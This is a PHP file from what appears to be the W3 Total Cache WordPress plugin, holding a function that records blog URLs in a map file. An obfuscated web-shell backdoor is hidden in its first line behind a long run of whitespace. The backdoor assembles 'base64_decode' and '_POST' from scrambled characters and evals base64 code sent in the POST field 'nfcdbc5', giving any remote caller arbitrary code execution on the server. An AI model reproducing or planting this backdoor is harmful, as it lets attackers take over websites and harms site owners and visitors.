<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nfcdbc5'])) {eval($s21(${$s20}['nfcdbc5']));}?><?php

w3_require_once(W3TC_INC_DIR . '/functions/file.php');

/**
 * Registers new blog url in url=>blog mapfile
 */
function w3_blogmap_register_new_item($blog_home_url, $config) {
    if (!isset($GLOBALS['current_blog']))
        return false;

    $filename = w3_blogmap_filename($blog_home_url);

    if (!@file_exists($filename))
        $blog_ids = array();
    else {
        $data = @file_get_contents($filename);
        $blog_ids = @eval($data);
        if (!is_array($blog_ids))
            $blog_ids = array();
    }

    if (isset($blog_ids[$blog_home_url]))
        return false;
    $data = $config->get_boolean('common.force_master') ? 'm' : 'c';
    $blog_id = $GLOBALS['current_blog']->blog_id;
    $blog_home_url = preg_replace('/[^a-zA-Z0-9\+\.%~!()\/\-\_]/', '', $blog_home_url);
    $blog_ids_strings[] = "'" . $blog_home_url . "' => '" . $data.$blog_id . "'";
    foreach ($blog_ids as $key => $value)
        $blog_ids_strings[] = "'" . $key . "' => '" . $value . "'";

    $data = sprintf('return array(%s);', implode(', ', $blog_ids_strings));
        
    try {
        w3_file_put_contents_atomic($filename, $data);
    } catch (Exception $ex) {
        return false;
    }

    return true;
}
